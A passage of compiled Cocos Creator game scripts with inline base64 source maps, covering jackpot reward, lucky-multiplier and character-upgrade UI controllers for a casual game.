QUFnSEMsQ0FoSGdELEVBQUUsQ0FBQyxTQUFTLEdBZ0g1RDtrQkFoSG9CLG1CQUFtQiIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbXBvcnQge1dvcmxkfSBmcm9tIFwiLi4vaW5mby9Xb3JsZFwiO1xyXG5pbXBvcnQgTmV0d29yayBmcm9tIFwiLi4vbmV0d29yay9OZXR3b3JrXCI7XHJcbmltcG9ydCB7TmV0d29ya0NvbmZpZ30gZnJvbSBcIi4uL2NvbmZpZy9OZXR3b3JrQ29uZmlnXCI7XHJcbmltcG9ydCB7RXhjZWxDb25maWd9IGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvY29uZmlnL0V4Y2VsQ29uZmlnXCI7XHJcbmltcG9ydCB7RXhjZWxUYWJsZU5hbWVzfSBmcm9tIFwiLi4vY29uZmlnL0V4Y2VsVGFibGVOYW1lc1wiO1xyXG5pbXBvcnQge2V4dH0gZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9leHRlbmQvRXh0ZW5kXCI7XHJcbmltcG9ydCBGYWNhZGUgZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9mYWNhZGUvRmFjYWRlXCI7XHJcblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIFJvbGVMYXllckNvbnRyb2xsZXIgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5SaWNoVGV4dClcclxuICAgIGhwTHZMYWJlbDogY2MuUmljaFRleHQgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5SaWNoVGV4dClcclxuICAgIGFkTHZMYWJlbDogY2MuUmljaFRleHQgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5SaWNoVGV4dClcclxuICAgIGhwQ29zdExhYmVsOiBjYy5SaWNoVGV4dCA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLlJpY2hUZXh0KVxyXG4gICAgYWRDb3N0TGFiZWw6IGNjLlJpY2hUZXh0ID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuUmljaFRleHQpXHJcbiAgICBocFdvcnRoTGFiZWw6Y2MuUmljaFRleHQgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5SaWNoVGV4dClcclxuICAgIGFkV29ydGhMYWJlbDpjYy5SaWNoVGV4dCA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLkJ1dHRvbilcclxuICAgIGhwTHZCdXR0b246Y2MuQnV0dG9uID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuQnV0dG9uKVxyXG4gICAgYWRCdXR0b246Y2MuQnV0dG9uID0gbnVsbDtcclxuXHJcbiAgICBvbkxvYWQgKCkge1xyXG4gICAgICAgIHRoaXMudXBkYXRlSHBVcCgpO1xyXG4gICAgICAgIHRoaXMudXBkYXRlQWRVcCgpO1xyXG4gICAgICAgIGNjLmZpbmQoJ0NhbnZhcycpLm9uKFwiVXBkYXRlU3RvcmFnZVwiLCB0aGlzLm9uVXBkYXRlU3RvcmFnZUV2ZW50LCB0aGlzKTtcclxuICAgIH1cclxuXHJcbiAgICBvbkRlc3Ryb3koKXtcclxuICAgICAgICBjYy5maW5kKCdDYW52YXMnKS5vZmYoXCJVcGRhdGVTdG9yYWdlXCIsIHRoaXMub25VcGRhdGVTdG9yYWdlRXZlbnQsIHRoaXMpO1xyXG4gICAgfVxyXG5cclxuICAgIG9uVXBkYXRlU3RvcmFnZUV2ZW50KGtleTpzdHJpbmcpe1xyXG4gICAgICAgIGlmIChrZXkgPT0gXCJnb2xkQ291bnRcIil7XHJcbiAgICAgICAgICAgIGxldCBjb25maWcgPSBFeGNlbENvbmZpZy5nZXRFeGNlbFRhYmxlKEV4Y2VsVGFibGVOYW1lcy5XZWFwb24pWzBdO1xyXG4gICAgICAgICAgICBpZiAoV29ybGQuU3RvcmFnZS5IcEx2IDwgY29uZmlnWydsdl9saW1pdCddKXtcclxuICAgICAgICAgICAgICAgIGxldCBuZWVkQ29zdCA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLldlYXBvblVwKVtXb3JsZC5TdG9yYWdlLkhwTHYtMV1bJ2xpZmVfZXhwZW5kJ107XHJcbiAgICAgICAgICAgICAgICB0aGlzLmhwTHZCdXR0b24uaW50ZXJhY3RhYmxlID0gV29ybGQuU3RvcmFnZS5nb2xkQ291bnQgPj0gbmVlZENvc3Q7XHJcbiAgICAgICAgICAgICAgICB0aGlzLmhwQ29zdExhYmVsLm5vZGUuY29sb3IgPSB0aGlzLmhwTHZCdXR0b24uaW50ZXJhY3RhYmxlP2NjLkNvbG9yLldISVRFOmNjLkNvbG9yLlJFRC5mcm9tSEVYKFwiIzkyNDMzOFwiKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICBpZiAoV29ybGQuU3RvcmFnZS5BREx2IDwgY29uZmlnWydsdl9saW1pdCddKXtcclxuICAgICAgICAgICAgICAgIGxldCBuZWVkQ29zdCA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLldlYXBvblVwKVtXb3JsZC5TdG9yYWdlLkFETHYtMV1bJ2ZpZ2h0X2V4cGVuZCddO1xyXG4gICAgICAgICAgICAgICAgdGhpcy5hZEJ1dHRvbi5pbnRlcmFjdGFibGUgPSBXb3JsZC5TdG9yYWdlLmdvbGRDb3VudCA+PSBuZWVkQ29zdDtcclxuICAgICAgICAgICAgICAgIHRoaXMuYWRDb3N0TGFiZWwubm9kZS5jb2xvciA9IHRoaXMuYWRCdXR0b24uaW50ZXJhY3RhYmxlP2NjLkNvbG9yLldISVRFOmNjLkNvbG9yLlJFRC5mcm9tSEVYKFwiIzkyNDMzOFwiKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICB1cGRhdGVIcFVwKCl7XHJcbiAgICAgICAgbGV0IGNvbmZpZyA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLldlYXBvbilbMF07XHJcbiAgICAgICAgdGhpcy5ocEx2TGFiZWwuc3RyaW5nID0gYDxiPjxvdXRsaW5lIGNvbG9yPSMxZTFlMWUgd2lkdGg9ND7nlJ/lkb3liptMdi4ke1dvcmxkLlN0b3JhZ2UuSHBMdn08L291dGxpbmU+PC9iPmA7XHJcbiAgICAgICAgaWYgKFdvcmxkLlN0b3JhZ2UuSHBMdiA+PSBjb25maWdbJ2x2X2xpbWl0J10pe1xyXG4gICAgICAgICAgICB0aGlzLmhwQ29zdExhYmVsLnN0cmluZyA9IGA8Yj48b3V0bGluZSBjb2xvcj0jMWUxZTFlIHdpZHRoPTM+5ruh57qnPC9vdXRsaW5lPjwvYj5gO1xyXG4gICAgICAgICAgICB0aGlzLmhwTHZCdXR0b24uaW50ZXJhY3RhYmxlID0gZmFsc2U7XHJcbiAgICAgICAgfWVsc2Uge1xyXG4gICAgICAgICAgICBsZXQgbmVlZENvc3QgPSBFeGNlbENvbmZpZy5nZXRFeGNlbFRhYmxlKEV4Y2VsVGFibGVOYW1lcy5XZWFwb25VcClbV29ybGQuU3RvcmFnZS5IcEx2LTFdWydsaWZlX2V4cGVuZCddO1xyXG4gICAgICAgICAgICB0aGlzLmhwQ29zdExhYmVsLnN0cmluZyA9IGA8Yj48b3V0bGluZSBjb2xvcj0jMWUxZTFlIHdpZHRoPTM+JHtleHQuc2hvcnRGb3JtYXQobmVlZENvc3QpfTwvb3V0bGluZT48L2I+YDtcclxuICAgICAgICAgICAgdGhpcy5ocEx2QnV0dG9uLmludGVyYWN0YWJsZSA9IFdvcmxkLlN0b3JhZ2UuZ29sZENvdW50ID49IG5lZWRDb3N0O1xyXG4gICAgICAgIH1cclxuICAgICAgICB0aGlzLmhwQ29zdExhYmVsLm5vZGUuY29sb3IgPSB0aGlzLmhwTHZCdXR0b24uaW50ZXJhY3RhYmxlP2NjLkNvbG9yLldISVRFOmNjLkNvbG9yLlJFRC5mcm9tSEVYKFwiIzkyNDMzOFwiKTtcclxuICAgICAgICBsZXQgbGlmZSA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLldlYXBvblVwKVtXb3JsZC5TdG9yYWdlLkhwTHYtMV1bJ2xpZmUnXTtcclxuICAgICAgICB0aGlzLmhwV29ydGhMYWJlbC5zdHJpbmcgPSBgPGI+PG91dGxpbmUgY29sb3I9IzFlMWUxZSB3aWR0aD0zPiR7ZXh0LnNob3J0Rm9ybWF0KGxpZmUpfTwvb3V0bGluZT48L2I+YDtcclxuICAgIH1cclxuXHJcbiAgICB1cGRhdGVBZFVwKCl7XHJcbiAgICAgICAgbGV0IGNvbmZpZyA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLldlYXBvbilbMF07XHJcbiAgICAgICAgdGhpcy5hZEx2TGFiZWwuc3RyaW5nID0gYDxiPjxvdXRsaW5lIGNvbG9yPSMxZTFlMWUgd2lkdGg9ND7miJjliptMdi4ke1dvcmxkLlN0b3JhZ2UuQURMdn08L291dGxpbmU+PC9iPmA7XHJcbiAgICAgICAgaWYgKFdvcmxkLlN0b3JhZ2UuQURMdiA+PSBjb25maWdbJ2x2X2xpbWl0J10pe1xyXG4gICAgICAgICAgICB0aGlzLmFkQ29zdExhYmVsLnN0cmluZyA9IGA8Yj48b3V0bGluZSBjb2xvcj0jMWUxZTFlIHdpZHRoPTM+5ruh57qnPC9vdXRsaW5lPjwvYj5gO1xyXG4gICAgICAgICAgICB0aGlzLmFkQnV0dG9uLmludGVyYWN0YWJsZSA9IGZhbHNlO1xyXG4gICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICAgIGxldCBuZWVkQ29zdCA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLldlYXBvblVwKVtXb3JsZC5TdG9yYWdlLkFETHYtMV1bJ2ZpZ2h0X2V4cGVuZCddO1xyXG4gICAgICAgICAgICB0aGlzLmFkQ29zdExhYmVsLnN0cmluZyA9IGA8Yj48b3V0bGluZSBjb2xvcj0jMWUxZTFlIHdpZHRoPTM+JHtleHQuc2hvcnRGb3JtYXQobmVlZENvc3QpfTwvb3V0bGluZT48L2I+YDtcclxuICAgICAgICAgICAgdGhpcy5hZEJ1dHRvbi5pbnRlcmFjdGFibGUgPSBXb3JsZC5TdG9yYWdlLmdvbGRDb3VudCA+PSBuZWVkQ29zdDtcclxuICAgICAgICB9XHJcbiAgICAgICAgdGhpcy5hZENvc3RMYWJlbC5ub2RlLmNvbG9yID0gdGhpcy5hZEJ1dHRvbi5pbnRlcmFjdGFibGU/Y2MuQ29sb3IuV0hJVEU6Y2MuQ29sb3IuUkVELmZyb21IRVgoXCIjOTI0MzM4XCIpO1xyXG4gICAgICAgIGxldCBmaWdodCA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLldlYXBvblVwKVtXb3JsZC5TdG9yYWdlLkFETHYtMV1bJ2ZpZ2h0J107XHJcbiAgICAgICAgdGhpcy5hZFdvcnRoTGFiZWwuc3RyaW5nID0gYDxiPjxvdXRsaW5lIGNvbG9yPSMxZTFlMWUgd2lkdGg9Mz4ke2V4dC5zaG9ydEZvcm1hdChmaWdodCl9PC9vdXRsaW5lPjwvYj5gO1xyXG4gICAgfVxyXG5cclxuICAgIG9uQ2xpY2tVcEhwTHYoZXZlbnQsIGRhdGEpe1xyXG4gICAgICAgIGNvbnNvbGUubG9nKFwi44CQY2xpY2vjgJFSb2xlTGF5ZXJDb250cm9sbGVyIFVwSHBMdlwiKVxyXG5cclxuICAgICAgICBsZXQgbmVlZENvc3QgPSBFeGNlbENvbmZpZy5nZXRFeGNlbFRhYmxlKEV4Y2VsVGFibGVOYW1lcy5XZWFwb25VcClbV29ybGQuU3RvcmFnZS5IcEx2LTFdWydsaWZlX2V4cGVuZCddO1xyXG4gICAgICAgIFdvcmxkLlN0b3JhZ2UuZ29sZENvdW50IC09IG5lZWRDb3N0O1xyXG4gICAgICAgIFdvcmxkLlN0b3JhZ2UuSHBMdisrO1xyXG4gICAgICAgIHRoaXMudXBkYXRlSHBVcCgpO1xyXG4gICAgICAgIEZhY2FkZS5jYW52YXNOb2RlLmVtaXQoXCJSb2xlVXBcIik7XHJcbiAgICB9XHJcblxyXG4gICAgcHJpdmF0ZSBfQWRVcENvdW50ID0gMDtcclxuXHJcbiAgICBvbkNsaWNrVXBBREx2KGV2ZW50LCBkYXRhKXtcclxuICAgICAgICBjb25zb2xlLmxvZyhcIuOAkGNsaWNr44CRUm9sZUxheWVyQ29udHJvbGxlciBVcEFETHZcIilcclxuXHJcbiAgICAgICAgbGV0IG5lZWRDb3N0ID0gRXhjZWxDb25maWcuZ2V0RXhjZWxUYWJsZShFeGNlbFRhYmxlTmFtZXMuV2VhcG9uVXApW1dvcmxkLlN0b3JhZ2UuQURMdi0xXVsnZmlnaHRfZXhwZW5kJ107XHJcbiAgICAgICAgV29ybGQuU3RvcmFnZS5nb2xkQ291bnQgLT0gbmVlZENvc3Q7XHJcbiAgICAgICAgV29ybGQuU3RvcmFnZS5BREx2Kys7XHJcbiAgICAgICAgdGhpcy51cGRhdGVBZFVwKCk7XHJcbiAgICAgICAgRmFjYWRlLmNhbnZhc05vZGUuZW1pdChcIlJvbGVVcFwiKTtcclxuICAgICAgICB0aGlzLl9BZFVwQ291bnQrKztcclxuICAgICAgICBsZXQgbmV3YmllTm9kZSA9IGNjLmRpcmVjdG9yLmdldFNjZW5lKCkuZ2V0Q2hpbGRCeU5hbWUoXCJuZXdiaWVOb2RlXCIpO1xyXG4gICAgICAgIGlmIChuZXdiaWVOb2RlICYmICghdGhpcy5hZEJ1dHRvbi5pbnRlcmFjdGFibGUgfHwgdGhpcy5fQWRVcENvdW50ID4gMikpe1xyXG4gICAgICAgICAgICBuZXdiaWVOb2RlLmRlc3Ryb3koKTtcclxuICAgICAgICAgICAgV29ybGQuTXkubmV3Ymllcy5maW5pc2goXCJGaXJzdFJvbGVVcFwiKTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/home/TakeJackpotController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '714fcJtcJtP9q86lkg3hnXM', 'TakeJackpotController');
// script/app/home/TakeJackpotController.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Facade_1 = require("../../../framework/facade/Facade");
var Extend_1 = require("../../../framework/extend/Extend");
var World_1 = require("../info/World");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var TakeJackpotController = /** @class */ (function (_super) {
    __extends(TakeJackpotController, _super);
    function TakeJackpotController() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.oneLabel = null;
        _this.threeLabel = null;
        _this.oneButtonNode = null;
        return _this;
    }
    // LIFE-CYCLE CALLBACKS:
    TakeJackpotController.prototype.onLoad = function () {
        this.updateView();
        Facade_1.default.canvasNode.on('UpdateStorage', this.onUpdateStorage, this);
        // this.oneBackgroundSprite.setMaterial(0, this.oneBackgroundSprite.getMaterial(1));
        // this.oneBackgroundSprite.setMaterial(0, cc.Material.getBuiltinMaterial("2d-gray-sprite"));
        // this.oneButtonNode.active = false;
        // this.scheduleOnce(()=>this.oneButtonNode.active = true, 3);
    };
    TakeJackpotController.prototype.onDestroy = function () {
        Facade_1.default.canvasNode.off('UpdateStorage', this.onUpdateStorage, this);
    };
    TakeJackpotController.prototype.onUpdateStorage = function (key) {
        if (key == "dayEarnTotal") {
            this.updateView();
        }
    };
    TakeJackpotController.prototype.updateView = function () {
        this.oneLabel.string = Extend_1.ext.shortFormat(World_1.World.Storage.dayEarnTotal);
        this.threeLabel.string = Extend_1.ext.shortFormat(World_1.World.Storage.dayEarnTotal * 3);
    };
    TakeJackpotController.prototype.onTakeIt = function (event, data) {
        data = parseInt(data);
        if (data == 1) {
            this.node.destroy();
            Facade_1.default.canvasNode.emit("TakeJackpot", 1);
        }
        else {
            /** 看广告 */
            this.node.destroy();
            Facade_1.default.canvasNode.emit("TakeJackpot", 3);
        }
    };
    __decorate([
        property(cc.Label)
    ], TakeJackpotController.prototype, "oneLabel", void 0);
    __decorate([
        property(cc.Label)
    ], TakeJackpotController.prototype, "threeLabel", void 0);
    __decorate([
        property(cc.Node)
    ], TakeJackpotController.prototype, "oneButtonNode", void 0);
    TakeJackpotController = __decorate([
        ccclass
    ], TakeJackpotController);
    return TakeJackpotController;
}(cc.Component));
exports.default = TakeJackpotController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2hvbWUvVGFrZUphY2twb3RDb250cm9sbGVyLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDQSwyREFBc0Q7QUFDdEQsMkRBQXFEO0FBQ3JELHVDQUFvQztBQUs5QixJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUcxQztJQUFtRCx5Q0FBWTtJQUEvRDtRQUFBLHFFQWlEQztRQTlDRyxjQUFRLEdBQWEsSUFBSSxDQUFDO1FBRzFCLGdCQUFVLEdBQWEsSUFBSSxDQUFDO1FBRzVCLG1CQUFhLEdBQVcsSUFBSSxDQUFDOztJQXdDakMsQ0FBQztJQXRDRyx3QkFBd0I7SUFFeEIsc0NBQU0sR0FBTjtRQUNJLElBQUksQ0FBQyxVQUFVLEVBQUUsQ0FBQztRQUNsQixnQkFBTSxDQUFDLFVBQVUsQ0FBQyxFQUFFLENBQUMsZUFBZSxFQUFFLElBQUksQ0FBQyxlQUFlLEVBQUUsSUFBSSxDQUFDLENBQUM7UUFDbEUsb0ZBQW9GO1FBQ3BGLDZGQUE2RjtRQUM3RixxQ0FBcUM7UUFDckMsOERBQThEO0lBQ2xFLENBQUM7SUFFRCx5Q0FBUyxHQUFUO1FBQ0ksZ0JBQU0sQ0FBQyxVQUFVLENBQUMsR0FBRyxDQUFDLGVBQWUsRUFBRSxJQUFJLENBQUMsZUFBZSxFQUFFLElBQUksQ0FBQyxDQUFDO0lBQ3ZFLENBQUM7SUFFRCwrQ0FBZSxHQUFmLFVBQWdCLEdBQVU7UUFDdEIsSUFBSSxHQUFHLElBQUksY0FBYyxFQUFDO1lBQ3RCLElBQUksQ0FBQyxVQUFVLEVBQUUsQ0FBQztTQUNyQjtJQUNMLENBQUM7SUFFRCwwQ0FBVSxHQUFWO1FBQ0ksSUFBSSxDQUFDLFFBQVEsQ0FBQyxNQUFNLEdBQUcsWUFBRyxDQUFDLFdBQVcsQ0FBQyxhQUFLLENBQUMsT0FBTyxDQUFDLFlBQVksQ0FBQyxDQUFDO1FBQ25FLElBQUksQ0FBQyxVQUFVLENBQUMsTUFBTSxHQUFHLFlBQUcsQ0FBQyxXQUFXLENBQUMsYUFBSyxDQUFDLE9BQU8sQ0FBQyxZQUFZLEdBQUMsQ0FBQyxDQUFDLENBQUM7SUFDM0UsQ0FBQztJQUVELHdDQUFRLEdBQVIsVUFBUyxLQUFLLEVBQUUsSUFBSTtRQUNoQixJQUFJLEdBQUcsUUFBUSxDQUFDLElBQUksQ0FBQyxDQUFDO1FBQ3RCLElBQUksSUFBSSxJQUFJLENBQUMsRUFBQztZQUNWLElBQUksQ0FBQyxJQUFJLENBQUMsT0FBTyxFQUFFLENBQUM7WUFDcEIsZ0JBQU0sQ0FBQyxVQUFVLENBQUMsSUFBSSxDQUFDLGFBQWEsRUFBRSxDQUFDLENBQUMsQ0FBQztTQUM1QzthQUFLO1lBQ0YsVUFBVTtZQUNWLElBQUksQ0FBQyxJQUFJLENBQUMsT0FBTyxFQUFFLENBQUM7WUFDcEIsZ0JBQU0sQ0FBQyxVQUFVLENBQUMsSUFBSSxDQUFDLGFBQWEsRUFBRSxDQUFDLENBQUMsQ0FBQztTQUM1QztJQUNMLENBQUM7SUE1Q0Q7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLEtBQUssQ0FBQzsyREFDTztJQUcxQjtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsS0FBSyxDQUFDOzZEQUNTO0lBRzVCO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUM7Z0VBQ1c7SUFUWixxQkFBcUI7UUFEekMsT0FBTztPQUNhLHFCQUFxQixDQWlEekM7SUFBRCw0QkFBQztDQWpERCxBQWlEQyxDQWpEa0QsRUFBRSxDQUFDLFNBQVMsR0FpRDlEO2tCQWpEb0IscUJBQXFCIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmltcG9ydCBGYWNhZGUgZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9mYWNhZGUvRmFjYWRlXCI7XHJcbmltcG9ydCB7ZXh0fSBmcm9tIFwiLi4vLi4vLi4vZnJhbWV3b3JrL2V4dGVuZC9FeHRlbmRcIjtcclxuaW1wb3J0IHtXb3JsZH0gZnJvbSBcIi4uL2luZm8vV29ybGRcIjtcclxuaW1wb3J0IHtNdXNpY30gZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9hdWRpby9NdXNpY1wiO1xyXG5pbXBvcnQge05ldHdvcmtDb25maWd9IGZyb20gXCIuLi9jb25maWcvTmV0d29ya0NvbmZpZ1wiO1xyXG5pbXBvcnQgTmV0d29yayBmcm9tIFwiLi4vbmV0d29yay9OZXR3b3JrXCI7XHJcblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIFRha2VKYWNrcG90Q29udHJvbGxlciBleHRlbmRzIGNjLkNvbXBvbmVudCB7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLkxhYmVsKVxyXG4gICAgb25lTGFiZWw6IGNjLkxhYmVsID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTGFiZWwpXHJcbiAgICB0aHJlZUxhYmVsOiBjYy5MYWJlbCA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICBvbmVCdXR0b25Ob2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIC8vIExJRkUtQ1lDTEUgQ0FMTEJBQ0tTOlxyXG5cclxuICAgIG9uTG9hZCAoKSB7XHJcbiAgICAgICAgdGhpcy51cGRhdGVWaWV3KCk7XHJcbiAgICAgICAgRmFjYWRlLmNhbnZhc05vZGUub24oJ1VwZGF0ZVN0b3JhZ2UnLCB0aGlzLm9uVXBkYXRlU3RvcmFnZSwgdGhpcyk7XHJcbiAgICAgICAgLy8gdGhpcy5vbmVCYWNrZ3JvdW5kU3ByaXRlLnNldE1hdGVyaWFsKDAsIHRoaXMub25lQmFja2dyb3VuZFNwcml0ZS5nZXRNYXRlcmlhbCgxKSk7XHJcbiAgICAgICAgLy8gdGhpcy5vbmVCYWNrZ3JvdW5kU3ByaXRlLnNldE1hdGVyaWFsKDAsIGNjLk1hdGVyaWFsLmdldEJ1aWx0aW5NYXRlcmlhbChcIjJkLWdyYXktc3ByaXRlXCIpKTtcclxuICAgICAgICAvLyB0aGlzLm9uZUJ1dHRvbk5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgLy8gdGhpcy5zY2hlZHVsZU9uY2UoKCk9PnRoaXMub25lQnV0dG9uTm9kZS5hY3RpdmUgPSB0cnVlLCAzKTtcclxuICAgIH1cclxuXHJcbiAgICBvbkRlc3Ryb3koKXtcclxuICAgICAgICBGYWNhZGUuY2FudmFzTm9kZS5vZmYoJ1VwZGF0ZVN0b3JhZ2UnLCB0aGlzLm9uVXBkYXRlU3RvcmFnZSwgdGhpcyk7XHJcbiAgICB9XHJcblxyXG4gICAgb25VcGRhdGVTdG9yYWdlKGtleTpzdHJpbmcpe1xyXG4gICAgICAgIGlmIChrZXkgPT0gXCJkYXlFYXJuVG90YWxcIil7XHJcbiAgICAgICAgICAgIHRoaXMudXBkYXRlVmlldygpO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICB1cGRhdGVWaWV3KCl7XHJcbiAgICAgICAgdGhpcy5vbmVMYWJlbC5zdHJpbmcgPSBleHQuc2hvcnRGb3JtYXQoV29ybGQuU3RvcmFnZS5kYXlFYXJuVG90YWwpO1xyXG4gICAgICAgIHRoaXMudGhyZWVMYWJlbC5zdHJpbmcgPSBleHQuc2hvcnRGb3JtYXQoV29ybGQuU3RvcmFnZS5kYXlFYXJuVG90YWwqMyk7XHJcbiAgICB9XHJcblxyXG4gICAgb25UYWtlSXQoZXZlbnQsIGRhdGEpe1xyXG4gICAgICAgIGRhdGEgPSBwYXJzZUludChkYXRhKTtcclxuICAgICAgICBpZiAoZGF0YSA9PSAxKXtcclxuICAgICAgICAgICAgdGhpcy5ub2RlLmRlc3Ryb3koKTtcclxuICAgICAgICAgICAgRmFjYWRlLmNhbnZhc05vZGUuZW1pdChcIlRha2VKYWNrcG90XCIsIDEpO1xyXG4gICAgICAgIH1lbHNlIHtcclxuICAgICAgICAgICAgLyoqIOeci+W5v+WRiiAqL1xyXG4gICAgICAgICAgICB0aGlzLm5vZGUuZGVzdHJveSgpO1xyXG4gICAgICAgICAgICBGYWNhZGUuY2FudmFzTm9kZS5lbWl0KFwiVGFrZUphY2twb3RcIiwgMyk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/game/GameOverLucky.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '43341ZZ4pdLh4MK2doeqynQ', 'GameOverLucky');
// script/app/game/GameOverLucky.ts

Object.defineProperty(exports, "__esModule", { value: true });
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var GameOverLucky = /** @class */ (function (_super) {
    __extends(GameOverLucky, _super);
    function GameOverLucky() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.contentNode = null;
        _this.templateLabel = null;
        _this.mask = null;
        return _this;
    }
    GameOverLucky.prototype.run = function (num, callback) {
        var min = 3;
        var offsetY = 0;
        var height = this.mask.node.height / 2 + this.templateLabel.node.height / 2;
        // let height = this.mask.node.height;
        for (var i = 0; i < 1; i++) {
            for (var j = 10; j >= min; j--) {
                var node = cc.instantiate(this.templateLabel.node);
                node.getComponent(cc.Label).string = "x" + j;
                node.x = 0;
                node.y = offsetY;
                offsetY += height;
                this.contentNode.addChild(node);
            }
        }
        for (var j = 10; j >= num; j--) {
            var node = cc.instantiate(this.templateLabel.node);
            node.getComponent(cc.Label).string = "x" + j;
            node.x = 0;
            node.y = offsetY;
            offsetY += height;
            this.contentNode.addChild(node);
        }
        this.templateLabel.node.active = false;
        offsetY -= height;
        var duration = offsetY / 1250;
        console.log(duration, offsetY, this.mask.node.height);
        this.contentNode.runAction(cc.sequence(cc.moveTo(duration, cc.v2(0, -offsetY)).easing(cc.easeSineInOut()), cc.delayTime(1), cc.callFunc(function () {
            console.log("finish.");
            callback();
        })));
    };
    __decorate([
        property(cc.Node)
    ], GameOverLucky.prototype, "contentNode", void 0);
    __decorate([
        property(cc.Label)
    ], GameOverLucky.prototype, "templateLabel", void 0);
    __decorate([
        property(cc.Mask)
    ], GameOverLucky.prototype, "mask", void 0);
    GameOverLucky = __decorate([
        ccclass
    ], GameOverLucky);
    return GameOverLucky;
}(cc.Component));
exports.default = GameOverLucky;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
